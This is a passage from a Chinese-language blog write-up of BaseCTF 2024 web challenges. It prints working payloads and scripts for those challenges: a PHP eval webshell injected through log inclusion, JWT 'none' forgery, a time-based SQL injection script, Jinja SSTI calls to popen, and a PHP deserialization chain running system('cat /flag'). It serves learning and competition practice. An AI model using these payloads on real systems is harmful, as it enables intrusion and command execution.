src="/hack3r0pium/basectf/6.png" alt="pic"></p><h2 id="Week3-滤个不停"><a href="#Week3-滤个不停" class="headerlink" title="[Week3] 滤个不停"></a>[Week3] 滤个不停</h2><p>考点: 日志存放路径，一句话木马</p><p>做题步骤: 感谢学长对这道题的帮助，搞了很久也是不知道怎么做，问学长得知考的是日志文件路径，网上找资料看文章，最后知道了对于Apache，日志存放路径：<code>/var/log/apache/access.log</code>而中出现<code>include()</code>，可以利用日志文件包含攻击，而且<code>/var/log/apache/access.log</code>刚好也满足<code>if(strpos($Datch,$char)===True)</code>，这道题非常巧妙，payload：最后bp发包，在User-Agent中最后加入<code>&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;</code></p><p><img src="/hack3r0pium/basectf/7.png" alt="pic"></p><h2 id="Week3-玩原神玩的"><a href="#Week3-玩原神玩的" class="headerlink" title="[Week3] 玩原神玩的"></a>[Week3] 玩原神玩的</h2><p>考点: 逆向解密，脚本</p><p>做题步骤: 直接叫gpt写了个脚本运行到了len的长度是45个，然后正确的tip参数：在GET请求中传递<code>tip=&quot;我要玩原神&quot;</code>，以通过ys_open的检查。构造正确的m参数：<code>m[0]</code>必须为<code>&quot;100%&quot;</code>，而<code>m[1]</code>则为<code>&quot;love100%&quot;</code>加上m[0]的MD5哈希。然后最后flag的逆向解密我也是叫gpt写脚本跑出来得到了flag，但是脚本我都没保存，可以直接参考官方的脚本，我就是脚本小子，都是叫gpt写的,官方脚本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$challenge_url</span> = <span class="string">&quot;http://challenge.basectf.fun:42801/?&quot;</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">45</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">  <span class="variable">$post</span> .= <span class="string">&quot;len[]=&quot;</span> . <span class="variable">$i</span> . <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">&#125; <span class="comment">// $_POST[&#x27;len&#x27;] == sizeof($array)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="string">&quot;tip=&quot;</span> . <span class="string">&quot;我要玩原神&quot;</span>; <span class="comment">// $tip != &quot;我要玩原神&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> .= <span class="string">&quot;m[]=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;100%&quot;</span>) . <span class="string">&quot;&amp;m[]=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;100%&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span> . <span class="string">&#x27;URL: &#x27;</span> . <span class="variable">$challenge_url</span> . <span class="variable">$get</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;POST Data: &#x27;</span> . <span class="variable">$post</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt_array</span>(<span class="variable">$curl</span>, [</span><br><span class="line">  CURLOPT_URL =&gt; <span class="variable">$challenge_url</span> . <span class="variable">$get</span>,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">  CURLOPT_ENCODING =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; <span class="number">10</span>,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; <span class="variable">$post</span>,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; [</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="variable">$err</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$curl</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$err</span>) <span class="keyword">die</span>(<span class="string">&#x27;cURL Error #:&#x27;</span> . <span class="variable">$err</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\[\&quot;(.*?)\&quot;\]/&#x27;</span>, <span class="variable">$response</span>, <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$matches</span>)) <span class="keyword">die</span>(<span class="string">&quot;Invalid JSON&quot;</span>);</span><br><span class="line"><span class="variable">$json</span> = <span class="string">&#x27;[&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>] . <span class="string">&#x27;&quot;]&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;MD5 Array: &quot;</span> . <span class="variable">$json</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$md5_array</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>; <span class="variable">$ii</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$md5_array</span>); <span class="variable">$ii</span>++) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ascii</span> = <span class="number">0</span>; <span class="variable">$ascii</span> &lt; <span class="number">256</span>; <span class="variable">$ascii</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$ascii</span> ^ <span class="variable">$ii</span>) === <span class="variable">$md5_array</span>[<span class="variable">$ii</span>]) &#123;</span><br><span class="line">      <span class="variable">$flag</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Flag: &quot;</span> . <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><h2 id="Week4-No-JWT"><a href="#Week4-No-JWT" class="headerlink" title="[Week4] No JWT"></a>[Week4] No JWT</h2><p>考点: jwt的none攻击，jwt修改签名算法漏洞</p><p>做题步骤: 这个漏洞利用的核心在于JWT的签名机制。在你的代码示例中，JWT的签名是使用HMAC算法（HS256）生成的，但是在<code>/flag</code>端点的实现中，验证签名的步骤被禁用了<code>（&quot;verify_signature&quot;: False）</code>。这意味着JWT的签名没有被检查，所以可以通过修改JWT的内容和签名算法来伪造有效的token。然后脚本伪造token解题的生成jwt脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment"># 不带签名的JWT</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;sub&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用空字符串作为密钥，生成无签名的token</span></span><br><span class="line">token = jwt.encode(payload, key=<span class="string">&#x27;&#x27;</span>, algorithm=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>发包脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 替换为你生成的token</span></span><br><span class="line">token = <span class="string">&#x27;YOUR_GENERATED_TOKEN&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;token&#125;</span>&#x27;</span>&#125;</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://localhost:5000/flag&#x27;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure><p>为什么使用无签名算法,在某些情况下，你可能会使用无签名算法（none）来生成JWT。无签名算法表示JWT不包含签名部分。这在实际应用中是不安全的，但在你提供的Flask应用中，由于代码禁用了签名验证，这就成为了一种攻击方法。然后发包就可以得到flag</p><h2 id="Week4-flag直接读取不就行了？"><a href="#Week4-flag直接读取不就行了？" class="headerlink" title="[Week4] flag直接读取不就行了？"></a>[Week4] flag直接读取不就行了？</h2><p>考点: php原生类，目录穿越</p><p>做题步骤：<br>首先利用<strong>DirectoryIterator</strong>原生类<br>执行echo函数时，会触发<strong>DirectoryIterator</strong>类中的 <strong>__toString()</strong> 方法，输出指定目录里面经过排序之后的第一个文件名，所以我们直接构造<code>../../../secret</code>，因为flag在secret目录下面，这个是试出来的，然后再利用<code>SplFileObject</code><br>读取文件的一行，不过需要加上filter协议才能读出来<code>J=SplFileObject&amp;H=php://filter/read=convert.base64-encode/resource=../../../../secret/f11444g.php</code></p><p><img src="/hack3r0pium/basectf/8.png" alt="pic"></p><h2 id="Week4-圣钥之战1-0"><a href="#Week4-圣钥之战1-0" class="headerlink" title="[Week4] 圣钥之战1.0"></a>[Week4] 圣钥之战1.0</h2><p>考点:python原型链污染</p><p>做题步骤： 先去<code>/read</code>找到源码，问了学长得知知识点是，网上找资料学习了一会，python原型链污染：</p><p><img src="/hack3r0pium/basectf/9.png" alt="pic"></p><p>特别注意：<br>并不是所有的类的属性都可以被污染，如Object的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到<br>源码中有<code>/pollute</code>这个路由上面有<code>merge</code>这个函数，而且<code>data</code>是可控的，所以我们就找到了攻击的点<br>Payload：一定要把<code>Content-Type</code>修改为<code>application/json</code></p><p><img src="/hack3r0pium/basectf/10.png" alt="pic"></p><p>然后返回&#x2F;read就可以得到flag</p><h2 id="Week4-only-one-sql"><a href="#Week4-only-one-sql" class="headerlink" title="[Week4] only one sql"></a>[Week4] only one sql</h2><p>考点:sql注入，时间盲注</p><p>做题步骤：select被禁用，无法通过常规查询来查询flag的值，然后可以<code>show tables</code>查询所有表，可以看到flag表，使用<code>show columns from flag</code>查询flag表的所有字段，然后猜测flag在data里，然后使用脚本来得到flag，原理就是代码试图在执行删除操作的同时引入延迟，以便测试是否存在 SQL 注入漏洞，如果请求超时（意味着延迟 5 秒钟），就说明猜测的字符是正确的，于是将这个字符加入到 flag 中，并且继续下一轮猜测。，官方脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sqlstr = string.ascii_lowercase + string.digits + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://your.website/?sql=delete%20from%20flag%20where%20data%20like%20%27&quot;</span></span><br><span class="line">end=<span class="string">&quot;%25%27%20and%20sleep(5)&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sqlstr:</span><br><span class="line">        payload = url +flag+ c + end</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(payload,timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag+c)</span><br><span class="line">            flag+=c</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Fin-1z-php"><a href="#Fin-1z-php" class="headerlink" title="[Fin] 1z_php"></a>[Fin] 1z_php</h2><p>考点:正则匹配回溯次数绕过，原生类，intval绕过</p><p>考点:正则匹配回溯次数绕过，原生类，intval绕过<br>做题步骤：首先老生常谈<code>e[m.p=114514.00001</code>，后面加上的<code>.00001</code>可以绕过intval，都是找资料了解的，后面try绕过两个正则用到回溯次数绕过，就是构造：一万个1.’HACKER’,脚本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="variable">$length</span> = <span class="number">1000000</span>;  <span class="comment">// 设置生成字符串的长度</span></span><br><span class="line"><span class="variable">$onesString</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;1&#x27;</span>, <span class="variable">$length</span>); <span class="comment">// 生成包含一百万个数字 &quot;1&quot; 的字符串 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$onesString</span>; <span class="comment">// 输出结果</span></span><br></pre></td></tr></table></figure><p>后面就是原生类了<code>a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString</code></p><h2 id="Fin-Back-to-the-future"><a href="#Fin-Back-to-the-future" class="headerlink" title="[Fin] Back to the future"></a>[Fin] Back to the future</h2><p>考点: git泄露</p><p>做题步骤：<code>robots.txt</code>找到 &#x2F;.git，所以考的就是git泄露了，使用工具scrabble，输入以下命令<br><img src="/hack3r0pium/basectf/11.png" alt="pic"></p><p>所以flag应该是在第一个地址里，然后使用命令得到flag</p><p><img src="/hack3r0pium/basectf/12.png" alt="pic"></p><h2 id="Fin-Jinja-Mark"><a href="#Fin-Jinja-Mark" class="headerlink" title="[Fin] Jinja Mark"></a>[Fin] Jinja Mark</h2><p>考点: python原生链污染，ssti</p><p>做题步骤： 先在flag路由下面bp爆破得到幸运数字，字典上网找，post传进去就得到源码，知道是python原型链污染<br><img src="/hack3r0pium/basectf/13.png" alt="pic"></p><p>源代码中得知magic路由下进行污染，污染payload在下面，目的是改{的解析变为&lt;，jinja_env：这是指 Jinja2 模板引擎的环境设置。在 Flask 中，jinja_env 用于配置模板的行为。variable_start_string 和 variable_end_string：这些字段定义了 Jinja2 中变量的开始和结束符号。默认情况下，它们是 。通过将它们改为 &lt;&lt; 和 &gt;&gt;，攻击者可以改变模板中变量的解析方式。最后是到index进行ssti注入，注入语句：<code>&lt;&lt;&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__.popen(&quot;ls /&quot;).read()&gt;&gt;</code></p><p><img src="/hack3r0pium/basectf/14.png" alt="pic"></p><h2 id="Fin-Lucky-Number"><a href="#Fin-Lucky-Number" class="headerlink" title="[Fin] Lucky Number"></a>[Fin] Lucky Number</h2><p>考点: python原生链污染，ssti</p><p>做题步骤：首先前往flag界面拿到源码，可以看到需要在m4G1c<br>进行污染，以及要利用的create函数，可知此处是要污染<code>heaven.py</code>的create函数的<code>__kwdefaults__</code>属性，由于create函数在另一个模块中，上面搜原型链污染的文章，得知：借助<code>sys</code>模块中的<code>module</code>属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：我们需要利用sys模块的modules属性来获取到heaven.py，但是代码中并没有导入sys模块。那么该怎么获取到这个模块呢？也是看文章得知在python中存在着<code>__spec__</code>内置属性，包含了关于类加载时的信息，定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到sys模块，此处就可以使用json模块获取，文章连接<code>https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIe0KdAKyDQwMzpeD&amp;u_atoken=1ee4f6a92f0be75d6c84bf149079b0cd&amp;u_asig=0a47314717266651223341433e00a0#toc-6</code> 最终的payload如下：<br><img src="/hack3r0pium/basectf/15.png" alt="pic"></p><p>ssti payload：<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__.popen("cat /flag").read()&#125;&#125;</code></p><h2 id="Fin-RCE-or-Sql-Inject"><a href="#Fin-RCE-or-Sql-Inject" class="headerlink" title="[Fin] RCE or Sql Inject"></a>[Fin] RCE or Sql Inject</h2><p>考点:sql注入，rce</p><p>做题步骤：题目hint1给出要RCE，hint2给出mysql远程连接和命令行操作有区别，hint3给出输个问号看看</p><p>照着提示的思路首先连接到我的mysql然后输入?看到，发现<code>system    (\!) Execute a system shell command</code>. Wp的解释是<code>system</code>关键字或<code>\!</code>可以直接通过mysql命令行执行一个system shell命令<br>然后我们直接命令执行，wp用的是<code>%0asystem+env</code>，我用的是<code>%0asystem%20env</code>同样可以，前面的<code>%0a</code>换行符是用来绕过过滤的</p><h2 id="Fin-Sql-Inject-or-RCE"><a href="#Fin-Sql-Inject-or-RCE" class="headerlink" title="[Fin] Sql Inject or RCE"></a>[Fin] Sql Inject or RCE</h2><p>考点:sql堆叠注入，rce</p><p>做题步骤：过滤了很多，wp提到了可以利用<code>delimiter</code>来更改一条sql语句的结束符，因为本来的；分隔符被过滤了，通过<code>delimiter</code>改分隔符才能实现多条语句一起传，然后用到堆叠注入，由于<code>select</code>被禁用无法查看flag，可以使用<code>handler</code>读表的方式来绕过，（在MySQL中，<code>handler</code> 是一个用于操作特定的索引类型的命令，而不是用于执行存储过程或触发器的命令。MySQL中的 <code>handler</code> 命令通常用于直接访问表的索引信息）需要注意的是handler读的时候read first中first被禁用，可以使用<code>read next</code>来绕过<br><img src="/hack3r0pium/basectf/16.png" alt="pic"></p><h2 id="Fin-ez-php"><a href="#Fin-ez-php" class="headerlink" title="[Fin] ez_php"></a>[Fin] ez_php</h2><p>考点:反序列化，特殊变量名传参，gc回收，引用绕过，反序列化逃逸</p><p>做题步骤：好难啊！看wp都看了好久，最后问了一下晨曦师傅才搞懂</p><p>首先要构造pop链，正常构造就好，不过有两个特别的知识点，第一个是wakeup的引用绕过，因为wakeup里面赋值了username为hacker会被正则匹配过滤掉，我们使用引用绕过，当end和username相互引用时，修改end的值也是在修改username的值。第二个是绕过<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code><br>这里有一个异常抛出，使得__destruct并不能触发，这时就需要使用gc回收的机制，使__destruct提前触发，让pop链能够往后走,gc回收知识点直接看博客：<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a> 所以把输出结果末尾的<code>i:2;N;&#125;</code>改成<code>i:1;N;&#125;</code>，即把2改成1。然后传就行。最后是逃逸substrstr函数，花了好久才理解，这道花了我一上午，知识点：<a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/</a>     总结就是每发送一个<code>%f0abc</code>，<code>mb_strpos</code>认为是4个字节，<code>mb_substr</code>认为是1个字节，相差3个字节</p><p>每发送一个<code>%f0%9fab</code>,<code>mb_strpos</code>认为是3个字节，<code>mb_substr</code>认为是1个字节，相差2个字节</p><p>每发送一个<code>%f0%9f%9fa</code>,<code>mb_strpos</code>认为是2个字节，<code>mb_substr</code>认为是1个字节，相差1个字节。</p><p>然后因为代码中有<code>$ctf=newHacker(&#39;&#123;&#123;&#123;'.$_GET['ez_ser.from_you'].'&#125;&#125;&#125;&#39;);</code> 所以前面的<code> O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;s:218:&quot;&#123;&#123;&#123;` 这部分并不是我们需要的，必须截掉，因此传入`substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab`  （这是字节数是算他们的差）Pop链：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>;   <span class="comment">//0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>();   <span class="comment">//-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t;  <span class="comment">//-2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f);  <span class="comment">//-3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)();  <span class="comment">//-2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r);      <span class="comment">//-1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$op1</span>=<span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"><span class="variable">$op2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$op3</span>=<span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$op4</span>=<span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$op5</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$op6</span>=<span class="keyword">new</span> <span class="title function_ invoke__">R</span>();</span><br><span class="line"><span class="variable">$op1</span>-&gt;end = &amp;<span class="variable">$op1</span>-&gt;username;   <span class="comment">//绕过wakeup的赋值</span></span><br><span class="line"><span class="variable">$op1</span>-&gt;start=<span class="variable">$op2</span>;</span><br><span class="line"><span class="variable">$op2</span>-&gt;c=<span class="variable">$op3</span>;</span><br><span class="line"><span class="variable">$op3</span>-&gt;t=<span class="variable">$op4</span>;</span><br><span class="line"><span class="variable">$op4</span>-&gt;f=<span class="variable">$op5</span>;</span><br><span class="line"><span class="variable">$op5</span>-&gt;e=<span class="variable">$op6</span>;</span><br><span class="line"><span class="variable">$op6</span>-&gt;r=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line"><span class="variable">$opop</span>=<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>=&gt;<span class="variable">$op1</span>,<span class="string">&#x27;2&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$opop</span>));</span><br></pre></td></tr></table></figure>Payload：`?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&ez[ser.from_you=a:2:&#123;i:1;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:20:"system("cat /flag");";&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;N;&#125;</code></p><p>写在结尾的一点点结语，第一篇博客，wp写了大概两天，博客弄好写好也是大概两三天，希望这篇对各位师傅们有所帮助，本人博客的初心是搭博客和写博客的过程中学习，同时与各位师傅们分享知识共同进步，感谢！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
            <tag> BaseCTF2024 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
